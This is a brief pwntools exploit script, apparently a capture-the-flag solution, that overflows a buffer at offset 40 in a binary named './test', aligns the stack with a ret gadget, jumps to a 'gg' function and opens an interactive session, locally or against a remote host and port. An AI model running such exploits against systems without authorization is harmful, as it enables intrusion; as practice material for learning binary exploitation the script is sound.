from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


exe = './test'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

offset = 40
ret = ROP(elf).find_gadget(['ret'])[0]
payload = flat({offset : [ret, elf.sym['gg']]})

io.sendline(payload)

io.interactive()

